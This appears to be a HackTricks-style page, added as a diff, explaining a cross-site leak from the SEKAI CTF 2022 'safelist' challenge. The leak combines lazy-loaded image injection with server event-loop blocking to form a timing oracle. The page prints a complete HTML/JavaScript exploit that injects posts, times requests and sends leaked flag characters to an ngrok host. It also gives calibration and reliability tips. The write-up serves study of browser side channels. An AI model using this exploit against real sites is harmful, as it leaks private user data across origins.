@@ -1,0 +1,208 @@
+# Event Loop Blocking + Lazy images
+
+{{#include ../../banners/hacktricks-training.md}}
+
+In [**this exploit**](https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45), [**@aszx87410**](https://twitter.com/aszx87410) mixes the **lazy image side channel** technique through a HTML injection with kind of **event loop blocking technique** to leak chars.<sup>[[1]](#references)[[2]](#references)</sup>
+
+This is a **different exploit for the CTF chall** that was already commented in the following page. take a look for more info about the challenge:
+
+
+{{#ref}}
+connection-pool-example.md
+{{#endref}}
+
+This technique is useful when the attacker can create a **Boolean oracle** based on whether a **lazy-loaded image** is fetched or not, but **cannot** directly observe that request because of CSP, `img-src` restrictions, or `Cache-Control: no-store`. Instead of waiting for an external callback, the exploit converts image loading into a **timing side channel** by making those image requests compete with other requests.
+
+The idea behind this exploit is:<sup>[[1]](#references)[[2]](#references)</sup>
+
+- The posts are loaded alphabetically
+- An **attacker** can **inject** a **post** starting with **"A"**, then some **HTML tag** (like a big **`<canvas`**) will fulfil most of the **screen** and some final **`<img lazy` tags** to load things.
+- If instead of an "A" the **attacker injects the same post but starting with a "z".** The **post** with the **flag** will appear **first**, then the **injected** **post** will appear with the initial "z" and the **big** **canvas**. Because the post with the flag appeared first, the first canvas will occupy all the screen and the final **`<img lazy`** tags injected **won't be seen** in the screen, so they **won't be loaded**.
+- Then, **while** the bot is **accessing** the page, the **attacker** will **send fetch requests**.
+  - If the **images** injected in the post are being **loaded**, these **fetch** requests will take **longer**, so the attacker knows that the **post is before the flag** (alphabetically).
+  - If the the **fetch** requests are **fast**, it means that the **post** is **alphabetically** **after** the flag.
+
+In other words, the oracle is:
+
+- **State 1**: the attacker-controlled post is within the browser lazy-loading threshold, so `img loading=lazy` requests are issued.
+- **State 2**: the attacker-controlled post remains outside that threshold, so those requests are not issued.
+- **Leak**: the attacker measures whether those extra requests create enough contention to delay another measurable operation.
+
+Let's check the code:<sup>[[1]](#references)</sup>
+
+```html
+<!DOCTYPE html>
+<html>
+  <!--
+  The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs event loop.
+  If images are loading, the request to "/" is slower, otherwise faster.
+  By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
+  We can use fetch to measure the request time.
+-->
+  <body>
+    <button onclick="run()">start</button>
+
+    <!-- Inject post with payload -->
+    <form
+      id="f"
+      action="http://localhost:1234/create"
+      method="POST"
+      target="_blank">
+      <input id="inp" name="text" value="" />
+    </form>
+
+    <!-- Remove index -->
+    <form
+      id="f2"
+      action="http://localhost:1234/remove"
+      method="POST"
+      target="_blank">
+      <input id="inp2" name="index" value="" />
+    </form>
+
+    <script>
+      let flag = "SEKAI{"
+      const TARGET = "https://safelist.ctf.sekai.team"
+      f.action = TARGET + "/create"
+      f2.action = TARGET + "/remove"
+
+      const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
+      // Function to leak info to attacker
+      const send = (data) => fetch("http://server.ngrok.io?d=" + data)
+      const charset = "abcdefghijklmnopqrstuvwxyz".split("")
+
+      // start exploit
+      let count = 0
+      setTimeout(async () => {
+        let L = 0
+        let R = charset.length - 1
+
+        // I have omited code here as apparently it wasn't necesary
+
+        // fallback to linerar since I am not familiar with binary search lol
+        for (let i = R; i >= L; i--) {
+          let c = charset[i]
+          send("try_" + flag + c)
+          const found = await testChar(flag + c)
+          if (found) {
+            send("found: " + flag + c)
+            flag += c
+            break
+          }
+        }
+      }, 0)
+
+      async function testChar(str) {
+        return new Promise((resolve) => {
+          /*
+            For 3350, you need to test it on your local to get this number.
+            The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
+            If starts with "A", the image should be loaded because it's in the threshold.
+          */
+          // <canvas height="3350px"> is experimental and allow to show the injected
+          // images when the post injected is the first one but to hide them when
+          // the injected post is after the post with the flag
+          inp.value =
+            str +
+            '<br><canvas height="3350px"></canvas><br>' +
+            Array.from({ length: 20 })
+              .map((_, i) => `<img loading=lazy src=/?${i}>`)
+              .join("")
+          f.submit()
+
+          setTimeout(() => {
+            run(str, resolve)
+          }, 500)
+        })
+      }
+
+      async function run(str, resolve) {
+        // Open posts page 5 times
+        for (let i = 1; i <= 5; i++) {
+          window.open(TARGET)
+        }
+
+        let t = 0
+        const round = 30 //Lets time 30 requests
+        setTimeout(async () => {
+          // Send 30 requests and time each
+          for (let i = 0; i < round; i++) {
+            let s = performance.now()
+            await fetch(TARGET + "/?test", {
+              mode: "no-cors",
+            }).catch((err) => 1)
+            let end = performance.now()
+            t += end - s
+            console.log(end - s)
+          }
+          const avg = t / round
+          // Send info about how much time it took
+          send(str + "," + t + "," + "avg:" + avg)
+
+          /*
+          I get this threshold(1000ms) by trying multiple times on remote admin bot
+          for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
+        */
+          const isFound = t >= 1000
+          if (isFound) {
+            inp2.value = "0"
+          } else {
+            inp2.value = "1"
+          }
+
+          // remember to delete the post to not break our leak oracle
+          f2.submit()
+          setTimeout(() => {
+            resolve(isFound)
+          }, 200)
+        }, 200)
+      }
+    </script>
+  </body>
+</html>
+```
+
+## Practical caveats
+
+This trick is **fragile** and needs to be **calibrated per environment**:
+
+- The **lazy-loading distance threshold** is browser-dependent and can change with browser version, connection type, and headless/headful mode. Chromium loads off-screen images **before** they are visible, so the right `<canvas height>` is usually found empirically. Also note that modern Chromium reduced some native lazy-loading thresholds (for example, roughly `1250px` on 4G and `2500px` on slower links), so older writeups that relied on `3000px+` margins can over-estimate current behavior.<sup>[[3]](#references)[[4]](#references)</sup>
+- In practice, **headless Chromium** can require a **different threshold** than a normal browser. In the original writeup, a value that worked locally (`1850px`) had to be increased for the remote headless bot (`3350px`).<sup>[[2]](#references)</sup>
+- Native `loading="lazy"` is only **deferred when JavaScript is enabled**, so this specific oracle can disappear if the browser disables JS or changes lazy-loading behavior for privacy reasons.<sup>[[3]](#references)</sup>
+- Give the lazy images an explicit **size** (or place them inside a container with deterministic dimensions) while calibrating the oracle. Browsers can treat unspecified images as `0x0`, decide that they already fit in the viewport, and eagerly fetch **all** of them, destroying the signal.<sup>[[4]](#references)</sup>
+- If the image response is **cacheable**, later probes become noisy or useless because the browser may satisfy the request from cache. This is why cache-busting parameters or `Cache-Control: no-store` matter a lot when testing this technique.
+
+## Reliability notes
+
+Compared to the related [connection pool example](connection-pool-example.md), this variant does **not** need an external image callback. It only needs a measurable slowdown. That slowdown can come from:
+
+- **Server-side event-loop blocking**, such as many image requests hitting a Node.js endpoint that performs synchronous work.
+- **Socket / connection contention**, where the attacker saturates available connections and times how long an additional request takes.
+
+To make the oracle more stable:
+
+- Use **multiple lazy images** instead of one.
+- Add a **cache-buster** to every image URL.
+- Measure **several requests** and compare an **average/median** instead of trusting a single sample.
+- Recalculate the **canvas height threshold** against the same browser family and execution mode used by the victim bot.
+- If `performance.now()` is too noisy, fall back to another **clock** (`requestAnimationFrame`, `MessageChannel`, or even `PerformanceObserver` watching `longtask` entries) and only classify runs when the slowdown is well above the browser's timer jitter.
+- The same **visibility-gated fetch** idea can be generalized beyond a plain lazy `<img>`. Recent research shows equivalent Boolean oracles built from nested `<object>` / `<iframe srcdoc>` trees and **responsive images** (`srcset` + `sizes`). If those conditional subresource loads are same-origin or callback-based, they can still be converted into the exact same contention/timing oracle described here.<sup>[[5]](#references)</sup>
+
+For more timing-based leak primitives, also check:
+
+{{#ref}}
+performance.now-+-force-heavy-task.md
+{{#endref}}
+
+> [!WARNING]
+> Some privacy-focused defenses can break the "load only after a browser-driven scroll/viewport change" assumption. For example, XS-Leaks wiki documents `Document-Policy: force-load-at-top` as a way to disable load-on-scroll behaviors such as Scroll-to-Text navigation, which can also reduce similar viewport-based oracles.
+
+## References
+
+- [1] [SEKAI CTF 2022 "safelist" lazy-image event-loop exploit (gist)](https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45)
+- [2] [SekaiCTF 2022 - safelist (XS-Leak) writeup](https://blog.huli.tw/2022/10/05/en/sekaictf2022-safelist-xsleak/)
+- [3] [MDN: `<img>` element reference](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/img)
+- [4] [web.dev: Browser-level image lazy loading](https://web.dev/articles/browser-level-image-lazy-loading)
+- [5] [From XS-Leaks to SS-Leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)
+
+{{#include ../../banners/hacktricks-training.md}}
